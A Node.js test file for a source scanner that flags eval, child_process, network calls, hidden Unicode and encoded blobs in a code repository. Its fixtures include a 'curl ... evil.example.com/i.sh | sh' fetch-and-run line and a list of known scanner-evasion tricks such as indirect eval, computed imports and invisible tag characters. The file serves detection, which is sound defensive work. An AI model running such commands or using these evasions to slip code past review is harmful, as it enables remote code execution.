import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanPath, scanText } from "./forbidden-patterns.mjs";

// Hostile fixtures are built at test time so no malicious text is committed.
const CASES = {
  eval: "const x = eval(payload);",
  "new-function": "const f = new Function('return 1');",
  "vm-run": "import vm from 'node:vm'; vm.runInNewContext(code);",
  "child-process": "import { exec } from 'node:child_process';",
  fetch: "await fetch('https://evil.example.com/x');",
  "http-request": "import https from 'node:https'; https.request(u);",
  net: "import net from 'node:net';",
  "curl-pipe-sh": "curl -fsSL https://evil.example.com/i.sh | sh",
  base64: `const blob = '${"QUJD".repeat(60)}';`,
  "long-line": "x".repeat(2100),
  "bidi-invisible": "const ok = true; // \u202e hidden",
};

const BYPASSES = {
  "globalThis.eval": "globalThis.eval(x);",
  "computed globalThis": "globalThis['ev'+'al'](x);",
  "indirect eval": "(0, eval)(x);",
  "bare Function": "Function(code)();",
  "constructor": "(()=>{}).constructor(code)();",
  "member fetch": "globalThis.fetch(u);",
  "computed import": "await import('node:' + 'child_process');",
  "variable import": "await import(name);",
  "process.binding": "process.binding('spawn_sync');",
  "dlopen": "process.dlopen(m, f);",
  "bare https import": "import { request } from 'https';",
  "tls": "import tls from 'node:tls';",
  "dgram": "import d from 'node:dgram';",
  "WebSocket": "new WebSocket(u);",
  "Worker": "new Worker(src, { eval: true });",
  "createRequire": "const r = createRequire(import.meta.url);",
  "block comment then code": "/* hi */ eval(x);",
  "tag chars": "const a = 1; // \u{E0049}\u{E0067}",
  "variation selectors": "const a = 'x\uFE01\uFE02';",
  "ALM": "const a = 1; // \u061C",
};

test("known bypass attempts are caught", () => {
  for (const [name, text] of Object.entries(BYPASSES)) {
    const t = text.replace(/\\u\{([0-9A-F]+)\}/g, (_, h) => String.fromCodePoint(parseInt(h, 16))).replace(/\\u([0-9A-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
    assert.ok(scanText(t, "packages/hub/src/evil.ts", { useAllow: false }).length > 0, `bypass not caught: ${name}`);
  }
});

test("pure comments and emoji selectors do not trip code rules", () => {
  assert.deepEqual(scanText("// mentions eval and fetch(x)\n * Function notes", "packages/hub/src/ok.ts"), []);
  assert.deepEqual(scanText("const s = '\u26A0\uFE0F warn';", "packages/hub/src/ok.ts"), []);
});

test("every rule fires on its fixture", () => {
  for (const [rule, text] of Object.entries(CASES)) {
    const hits = scanText(text, "packages/hub/src/evil.ts", { useAllow: false });
    assert.ok(hits.some((h) => h.rule === rule), `rule ${rule} did not fire`);
  }
});

test("zero-width space in a markdown doc is still caught", () => {
  assert.equal(scanText("hello\u200bworld", "docs/x.md").length, 1);
});

test("harmless code passes", () => {
  assert.deepEqual(scanText("const a = 1;\nconsole.log(a.toString());\n// fetching is mentioned in a comment? no", "packages/hub/src/ok.ts"), []);
});

test("a new file using child_process is rejected, allowlisted exact file is not", () => {
  const line = "import { spawn } from 'node:child_process';";
  assert.equal(scanText(line, "packages/hub/src/newfile.ts").length, 1);
  assert.equal(scanText(line, "packages/hub/src/git.ts").length, 0);
});

test("allowlist is exact: a sibling path of an allowed file is rejected", () => {
  assert.equal(scanText("await fetch(u);", "packages/hub/src/server.ts.evil.ts").length, 1);
});

test("test files may use network/process, but not eval", () => {
  assert.equal(scanText("await fetch(u);", "packages/hub/src/x.test.ts").length, 0);
  assert.equal(scanText("eval(x)", "packages/hub/src/x.test.ts").length, 1);
});

test("scanPath walks a directory and reports file:line", () => {
  const dir = mkdtempSync(join(tmpdir(), "fp-"));
  mkdirSync(join(dir, "src"));
  writeFileSync(join(dir, "src", "bad.ts"), "ok\neval(x)\n");
  const hits = scanPath(dir, dir, { useAllow: false });
  assert.equal(hits.length, 1);
  assert.equal(hits[0].line, 2);
  assert.equal(hits[0].file, "src/bad.ts");
});
